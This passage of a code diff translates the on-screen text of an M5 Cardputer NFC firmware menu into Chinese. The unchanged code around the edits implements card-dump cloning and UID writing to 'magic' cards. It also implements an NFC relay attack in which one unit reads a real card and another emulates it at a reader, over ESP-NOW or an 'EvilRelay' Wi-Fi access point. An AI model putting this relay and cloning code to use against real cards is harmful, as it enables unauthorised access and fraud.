                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000); break;
             }
@@ -50937,11 +51234,11 @@ void nfcMenu() {
             // Place tag screen
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 14, 0x0841);
-            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF");
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("写入 NDEF");
             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-            sp.setCursor(20, 50); sp.print("Place NTAG/Ultralight...");
+            sp.setCursor(20, 50); sp.print("请放置 NTAG/Ultralight...");
             sp.fillRect(0, H-14, W, 14, 0x0841);
-            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=cancel");
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=取消");
             if (use_sprite) sprite->pushSprite(0, 0);
 
             while (true) {
@@ -50952,21 +51249,21 @@ void nfcMenu() {
                 if (card.valid && (card.sak == 0x00 || card.sak == 0x04)) {
                     sp.fillScreen(TFT_BLACK);
                     sp.setTextColor(TFT_CYAN, TFT_BLACK);
-                    sp.setCursor(10, 30); sp.print("Writing...");
-                    sp.setCursor(10, 45); sp.printf("%d bytes → %d pages", tlv_len, (tlv_len+3)/4);
+                    sp.setCursor(10, 30); sp.print("正在写入...");
+                    sp.setCursor(10, 45); sp.printf("%d 字节 -> %d 页", tlv_len, (tlv_len+3)/4);
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     bool ok = nfc_write_ndef(tlv_buf, tlv_len);
                     sp.fillScreen(TFT_BLACK);
                     if (ok) {
                         sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                        sp.setCursor(10, 50); sp.print("NDEF written!");
+                        sp.setCursor(10, 50); sp.print("NDEF 写入成功!");
                     } else {
                         sp.setTextColor(TFT_RED, TFT_BLACK);
-                        sp.setCursor(10, 50); sp.print("Write failed!");
+                        sp.setCursor(10, 50); sp.print("写入失败!");
                     }
                     sp.setTextColor(0x5AEB, TFT_BLACK);
-                    sp.setCursor(10, 75); sp.print("BACK=menu");
+                    sp.setCursor(10, 75); sp.print("BACK=菜单");
                     if (use_sprite) sprite->pushSprite(0, 0);
                     while (true) {
                         M5.update(); cardUpdate();
@@ -50999,7 +51296,7 @@ void nfcMenu() {
             if (file_count == 0) {
                 sp.fillScreen(TFT_BLACK);
                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 55); sp.print("No saved dumps found");
+                sp.setCursor(10, 55); sp.print("未找到已存转储");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000);
             } else {
@@ -51008,7 +51305,7 @@ void nfcMenu() {
                 while (selecting) {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write Clone");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("克隆写入");
                     for (int i = 0; i < min(file_count, 7); i++) {
                         sp.setTextColor(i == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
                         sp.setCursor(4, 18 + i * 14);
@@ -51017,7 +51314,7 @@ void nfcMenu() {
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print(".,=dn TAB=up ENTER=write");
+                    sp.print(".,=下 TAB=上 ENTER=写入");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     while (true) {
@@ -51034,7 +51331,7 @@ void nfcMenu() {
                             if (n_blocks == 0) {
                                 sp.fillScreen(TFT_BLACK);
                                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                                sp.setCursor(10, 55); sp.print("No block data in file");
+                                sp.setCursor(10, 55); sp.print("文件中无块数据");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                                 delay(2000); break;
                             }
@@ -51042,10 +51339,10 @@ void nfcMenu() {
                             // Show "Place target card..."
                             sp.fillScreen(TFT_BLACK);
                             sp.fillRect(0, 0, W, 14, 0x0841);
-                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write Clone");
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("克隆写入");
                             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                            sp.setCursor(20, 50); sp.printf("Blocks: %d", n_blocks);
-                            sp.setCursor(20, 65); sp.print("Place target card...");
+                            sp.setCursor(20, 50); sp.printf("块数: %d", n_blocks);
+                            sp.setCursor(20, 65); sp.print("请放置目标卡...");
                             if (use_sprite) sprite->pushSprite(0, 0);
 
                             // Wait for card
@@ -51061,7 +51358,7 @@ void nfcMenu() {
                             if (!target.valid) {
                                 sp.fillScreen(TFT_BLACK);
                                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                                sp.setCursor(10, 55); sp.print("No card detected");
+                                sp.setCursor(10, 55); sp.print("未检测到卡片");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                                 delay(2000); break;
                             }
@@ -51148,15 +51445,15 @@ void nfcMenu() {
                                 int pct = (blk + 1) * 100 / n_blocks;
                                 sp.fillScreen(TFT_BLACK);
                                 sp.fillRect(0, 0, W, 14, 0x0841);
-                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Writing...");
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("正在写入...");
                                 sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                                sp.setCursor(10, 30); sp.printf("Block %d / %d", blk, n_blocks);
+                                sp.setCursor(10, 30); sp.printf("块 %d / %d", blk, n_blocks);
                                 sp.fillRect(10, 50, 220, 12, 0x2104);
                                 sp.fillRect(10, 50, pct * 220 / 100, 12, TFT_GREEN);
-                                sp.setCursor(10, 70); sp.printf("OK: %d  Fail: %d", written, failed);
+                                sp.setCursor(10, 70); sp.printf("成功: %d  失败: %d", written, failed);
                                 if (!blk_ok) {
                                     sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                                    sp.setCursor(10, 85); sp.printf("Last: %s", fail_reason);
+                                    sp.setCursor(10, 85); sp.printf("上次错误: %s", fail_reason);
                                 }
                                 if (use_sprite) sprite->pushSprite(0, 0);
                             }
@@ -51166,15 +51463,15 @@ void nfcMenu() {
                             sp.fillScreen(TFT_BLACK);
                             sp.fillRect(0, 0, W, 14, 0x0841);
                             sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-                            sp.print(failed == 0 ? "Clone Complete!" : "Clone Partial");
+                            sp.print(failed == 0 ? "克隆完成!" : "部分克隆完成");
                             sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                            sp.setCursor(10, 30); sp.printf("Written: %d blocks", written);
+                            sp.setCursor(10, 30); sp.printf("已写入: %d 块", written);
                             if (failed > 0) {
                                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                                sp.setCursor(10, 45); sp.printf("Failed: %d blocks", failed);
+                                sp.setCursor(10, 45); sp.printf("失败: %d 块", failed);
                             }
                             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                            sp.setCursor(10, 70); sp.print("BACK=menu");
+                            sp.setCursor(10, 70); sp.print("BACK=菜单");
                             if (use_sprite) sprite->pushSprite(0, 0);
                             while (true) {
                                 M5.update(); cardUpdate();
@@ -51209,7 +51506,7 @@ void nfcMenu() {
             if (file_count == 0) {
                 sp.fillScreen(TFT_BLACK);
                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 55); sp.print("No saved tags found");
+                sp.setCursor(10, 55); sp.print("未找到已存标签");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000);
             } else {
@@ -51218,7 +51515,7 @@ void nfcMenu() {
                 while (picking) {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write UID");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("写入 UID");
                     for (int i = 0; i < min(file_count, 7); i++) {
                         sp.setTextColor(i == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
                         sp.setCursor(4, 18 + i * 14);
@@ -51227,7 +51524,7 @@ void nfcMenu() {
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print(";=up .=dn ENT=write BACK=menu");
+                    sp.print(";=上 .=下 ENT=写入 BACK=菜单");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     while (true) {
@@ -51257,12 +51554,12 @@ void nfcMenu() {
 
                             sp.fillScreen(TFT_BLACK);
                             sp.fillRect(0, 0, W, 14, 0x0841);
-                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write UID");
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("写入 UID");
                             sp.setTextColor(TFT_GREEN, TFT_BLACK);
                             sp.setCursor(10, 22); sp.print("UID: ");
                             for (int i = 0; i < uid_len; i++) sp.printf("%02X ", uid[i]);
                             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                            sp.setCursor(10, 40); sp.print("Place magic card...");
+                            sp.setCursor(10, 40); sp.print("请放置魔术卡(UID卡)...");
                             if (use_sprite) sprite->pushSprite(0, 0);
 
                             // Try writing block 0 — multiple methods
@@ -51417,17 +51714,17 @@ void nfcMenu() {
                             sp.fillScreen(TFT_BLACK);
                             if (ok) {
                                 sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                                sp.setCursor(10, 50); sp.print("UID written!");
+                                sp.setCursor(10, 50); sp.print("UID 写入成功!");
                                 sp.setCursor(10, 65);
                                 for (int i = 0; i < uid_len; i++) sp.printf("%02X ", uid[i]);
                             } else {
                                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                                sp.setCursor(10, 45); sp.print("Write failed!");
-                                sp.setCursor(10, 60); sp.print("Not a Gen1 magic card?");
-                                sp.setCursor(10, 75); sp.print("Try with a Gen1a/UID card");
+                                sp.setCursor(10, 45); sp.print("写入失败!");
+                                sp.setCursor(10, 60); sp.print("非 Gen1 魔术卡?");
+                                sp.setCursor(10, 75); sp.print("请尝试使用 Gen1a/UID 卡");
                             }
                             sp.fillRect(0, H-14, W, 14, 0x0841);
-                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+                            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=菜单");
                             if (use_sprite) sprite->pushSprite(0, 0);
                             while (true) {
                                 M5.update(); cardUpdate();
@@ -51445,15 +51742,15 @@ void nfcMenu() {
             // ── Mode 7: Card Emulation / Relay (jalons 1-3) ──
         if (mode == 7) {
             // ── Choix de la liaison de relais : Dual (2 Cardputer/ESP-NOW) ou APK (telephone/WiFi) ──
-            int conn = -1; { int cs = 0; bool cd = true; const char* citems[] = { "APK (WiFi phone)", "Dual (2 Cardputer)" };
+            int conn = -1; { int cs = 0; bool cd = true; const char* citems[] = { "APK (手机WiFi)", "双机 (2台Cardputer)" };
                 while (conn < 0) {
                     if (cd) {
                         sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay - liaison");
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继 - 连接方式");
                         for (int i = 0; i < 2; i++) { sp.setTextColor(i == cs ? TFT_GREEN : TFT_WHITE, TFT_BLACK); sp.setCursor(10, 28 + i * 18); sp.print(i == cs ? "> " : "  "); sp.print(citems[i]); }
-                        sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 74); sp.print("APK: phone reads card (WiFi)");
-                        sp.setCursor(6, 88); sp.print("Dual: 2nd Cardputer+HAT");
-                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT BACK");
+                        sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 74); sp.print("APK: 手机读卡 (WiFi)");
+                        sp.setCursor(6, 88); sp.print("双机: 第2台Cardputer+模块");
+                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/.选择 ENT=确认 BACK=返回");
                         if (use_sprite) sprite->pushSprite(0, 0); cd = false;
                     }
                     M5.update(); cardUpdate();
@@ -51531,14 +51828,14 @@ void nfcMenu() {
                         if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
                         if (millis() - wd > 300) { wd = millis();
                             int sta = WiFi.softAPgetStationNum();   // phone(s) associated to the AP (even with the app closed)
-                            sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (APK)");
+                            sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继模拟 (APK)");
                             sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 24); sp.print("AP: EvilRelay");
-                            sp.setCursor(6, 38); sp.print("pass: evilrelay1234");
+                            sp.setCursor(6, 38); sp.print("密码: evilrelay1234");
                             sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(6, 54); sp.printf("%s : 5566", apip.toString().c_str());
-                            if (sta > 0) { sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(6, 74); sp.printf("WiFi: %d connected", sta); }
-                            else          { sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 74); sp.print("WiFi: no phone"); }
-                            sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(6, 90); sp.print("App: closed (waiting...)");
-                            sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=stop");
+                            if (sta > 0) { sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(6, 74); sp.printf("WiFi: 已连 %d 台", sta); }
+                            else          { sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 74); sp.print("WiFi: 未连手机"); }
+                            sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(6, 90); sp.print("应用: 未打开 (等待中...)");
+                            sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=停止");
                             if (use_sprite) sprite->pushSprite(0, 0);
                         }
                         delay(10);
@@ -51555,10 +51852,10 @@ void nfcMenu() {
                         M5.update(); cardUpdate();
                         if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
                         if (millis() - wd2 > 300) { wd2 = millis();
-                            sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (APK)");
-                            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(6, 30); sp.print("App open - connected");
-                            sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 50); sp.print("Tap a card on the phone");
-                            sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=stop");
+                            sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继模拟 (APK)");
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(6, 30); sp.print("应用已连接");
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 50); sp.print("请在手机背面贴卡");
+                            sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=停止");
                             if (use_sprite) sprite->pushSprite(0, 0);
                         }
                         delay(10);
@@ -51590,13 +51887,13 @@ void nfcMenu() {
                                 else if ((pcb & 0xE2) == 0x02) { relay_service_iblock(frame, n, &seq, &relayed, &wtx_sent); }
                             }
                             if (millis() - lastDraw > 200) { lastDraw = millis();
-                                sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (APK)");
-                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("Emul UID: "); for (int i = 0; i < rly_uid_len; i++) sp.printf("%02X", rly_uid[i]);
+                                sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继模拟 (APK)");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("模拟 UID: "); for (int i = 0; i < rly_uid_len; i++) sp.printf("%02X", rly_uid[i]);
                                 sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34); sp.printf("SAK %02X ATS %db", rly_sak, ats_use_len);
-                                sp.setCursor(4, 48); sp.printf("Field: %s", (tgt_irq & 0x80) ? "ON " : ((tgt_irq & 0x40) ? "off" : "-"));
-                                sp.setCursor(4, 62); sp.printf("Relayed:%d WTX:%d", relayed, wtx_sent);
-                                sp.setCursor(4, 76); sp.printf("App:%s RTT %lums", rly_tcp.connected() ? "OK" : "NO", g_last_rtt);
-                                sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=stop");
+                                sp.setCursor(4, 48); sp.printf("场强: %s", (tgt_irq & 0x80) ? "开启" : ((tgt_irq & 0x40) ? "关闭" : "-"));
+                                sp.setCursor(4, 62); sp.printf("已中继:%d WTX:%d", relayed, wtx_sent);
+                                sp.setCursor(4, 76); sp.printf("应用:%s 延迟 %lums", rly_tcp.connected() ? "正常" : "断开", g_last_rtt);
+                                sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=停止");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                             }
                             M5.update(); cardUpdate();
@@ -51615,20 +51912,20 @@ void nfcMenu() {
                 WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
             } else if (conn == 0) {
             // Sub-menu: pick role
-            const char* rl_items[] = {"Emul capture", "Relay: Reader (A)", "Relay: Emul (B)", "VirtCard (A) noHAT"};
+            const char* rl_items[] = {"模拟捕获", "中继: 读卡端 (A)", "中继: 模拟端 (B)", "虚拟卡 (A) 无模块"};
             const int rl_n = 4;
             int rl_sel = 0; int role = -1; bool rl_draw = true;
             while (role < 0) {
                 if (rl_draw) {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("NFC Relay/Emul");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("NFC 中继/模拟");
                     for (int i = 0; i < rl_n; i++) {
                         sp.setTextColor(i == rl_sel ? TFT_GREEN : TFT_WHITE, TFT_BLACK);
                         sp.setCursor(10, 24 + i * 16); sp.print(i == rl_sel ? "> " : "  "); sp.print(rl_items[i]);
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
-                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print(";/. ENT BACK");
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print(";/.选择 ENT=确认 BACK=返回");
                     if (use_sprite) sprite->pushSprite(0, 0);
                     rl_draw = false;
                 }
@@ -51644,9 +51941,9 @@ void nfcMenu() {
             if (role == 0) {
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841);
-                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emul capture");
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("模拟捕获");
                 sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                sp.setCursor(20, 55); sp.print("Place card to CLONE...");
+                sp.setCursor(20, 55); sp.print("请放置要克隆的卡片...");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 NfcCardInfo card = {}; bool cancelled = false;
                 while (!card.valid) {
@@ -51673,15 +51970,15 @@ void nfcMenu() {
                         if (millis() - lastDraw > 200) {
                             lastDraw = millis();
                             sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emul capture");
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("模拟捕获");
                             sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("UID: ");
                             for (int i = 0; i < card.uid_len; i++) sp.printf("%02X", card.uid[i]);
                             sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34); sp.printf("ATQA %04X SAK %02X", card.atqa, card.sak);
-                            sp.setCursor(4, 48); sp.printf("Field: %s", (tgt_irq & 0x80) ? "ON " : ((tgt_irq & 0x40) ? "off" : "-"));
-                            sp.setCursor(4, 62); sp.printf("Frames: %d", cap);
-                            sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 80); sp.print("Last:");
-                            sp.setCursor(4, 92); sp.print(last[0] ? last : "(waiting reader)");
-                            sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                            sp.setCursor(4, 48); sp.printf("场强: %s", (tgt_irq & 0x80) ? "开启" : ((tgt_irq & 0x40) ? "关闭" : "-"));
+                            sp.setCursor(4, 62); sp.printf("帧数: %d", cap);
+                            sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 80); sp.print("最近帧:");
+                            sp.setCursor(4, 92); sp.print(last[0] ? last : "(等待读卡器)");
+                            sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=停止");
                             if (use_sprite) sprite->pushSprite(0, 0);
                         }
                         M5.update(); cardUpdate();
@@ -51694,8 +51991,8 @@ void nfcMenu() {
             // ===== Role 1: Relay Reader unit A (sits on the real card) =====
             else if (role == 1) {
                 sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Reader (A)");
-                sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(20, 55); sp.print("Place card on reader...");
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继读卡端 (A)");
+                sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(20, 55); sp.print("请将卡片放在读卡器上...");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 // ensure reader field mode
                 nfc_cmd(NFC_CMD_STOP_ALL); nfc_wr(NFC_MODE_DEF, 0x09); nfc_wr(NFC_BIT_RATE, 0x00);
@@ -51719,7 +52016,7 @@ void nfcMenu() {
                     }
                     nfc_i_block_num = 0;   // fresh ISO-DEP block numbering for this relay session (A<->card)
                     if (!rly_begin()) {
-                        sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 110); sp.print("ESP-NOW init fail"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
+                        sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 110); sp.print("ESP-NOW 初始化失败"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
                     } else {
                         // build IDENT payload
                         uint8_t ident[80]; int ii = 0;
@@ -51764,13 +52061,13 @@ void nfcMenu() {
                             // au relais, l'ecran se rafraichit juste assez.
                             if (millis() - lastDraw > 200) { lastDraw = millis();
                                 sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Reader (A)");
-                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 22); sp.print("Card UID: ");
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继读卡端 (A)");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 22); sp.print("卡片 UID: ");
                                 for (int i = 0; i < card.uid_len; i++) sp.printf("%02X", card.uid[i]);
                                 sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 38); sp.printf("SAK %02X  ATS %db", card.sak, ats_len);
-                                sp.setCursor(4, 54); sp.print("Tunnel: ESP-NOW ch1");
-                                sp.setCursor(4, 70); sp.printf("APDUs relayed: %d", served);
-                                sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                sp.setCursor(4, 54); sp.print("隧道: ESP-NOW 信道1");
+                                sp.setCursor(4, 70); sp.printf("已中继 APDU: %d", served);
+                                sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=停止");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                             }
                             M5.update(); cardUpdate();
@@ -51785,11 +52082,11 @@ void nfcMenu() {
             // ===== Role 2: Relay Emulator unit B (sits on the real reader) =====
             else if (role == 2) {
                 if (!rly_begin()) {
-                    sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 55); sp.print("ESP-NOW init fail"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
+                    sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 55); sp.print("ESP-NOW 初始化失败"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
                 } else {
                     sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (B)");
-                    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(10, 55); sp.print("Waiting Reader unit A...");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继模拟端 (B)");
+                    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(10, 55); sp.print("等待读卡端 A...");
                     if (use_sprite) sprite->pushSprite(0, 0);
                     bool cancelled = false;
                     while (!rly_ident_ready) {
@@ -51844,16 +52141,16 @@ void nfcMenu() {
                             if (millis() - lastDraw > 200) {
                                 lastDraw = millis();
                                 sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (B)");
-                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("Emul UID: ");
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("中继模拟端 (B)");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("模拟 UID: ");
                                 for (int i = 0; i < rly_uid_len; i++) sp.printf("%02X", rly_uid[i]);
                                 sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34); sp.printf("SAK %02X ATS %db", rly_sak, ats_use_len);
-                                sp.setCursor(4, 48); sp.printf("Field: %s", (tgt_irq & 0x80) ? "ON " : ((tgt_irq & 0x40) ? "off" : "-"));
-                                sp.setCursor(4, 62); sp.printf("Relayed:%d WTX:%d", relayed, wtx_sent);
-                                sp.setCursor(4, 76); sp.printf("RTT %lu/%lums max", g_last_rtt, g_max_rtt);
-                                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 92); sp.print("Last:");
-                                sp.setCursor(4, 104); sp.print(last[0] ? last : "(waiting reader)");
-                                sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                sp.setCursor(4, 48); sp.printf("场强: %s", (tgt_irq & 0x80) ? "开启" : ((tgt_irq & 0x40) ? "关闭" : "-"));
+                                sp.setCursor(4, 62); sp.printf("已中继:%d WTX:%d", relayed, wtx_sent);
+                                sp.setCursor(4, 76); sp.printf("延迟 %lu/%lums 最大", g_last_rtt, g_max_rtt);
+                                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 92); sp.print("最近帧:");
+                                sp.setCursor(4, 104); sp.print(last[0] ? last : "(等待读卡器)");
+                                sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=停止");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                             }
                             M5.update(); cardUpdate();
@@ -51868,7 +52165,7 @@ void nfcMenu() {
             // ===== Role 3: Virtual card A (no NFC HAT) — jalon-3 ESP-NOW end-to-end validation =====
             else if (role == 3) {
                 if (!rly_begin()) {
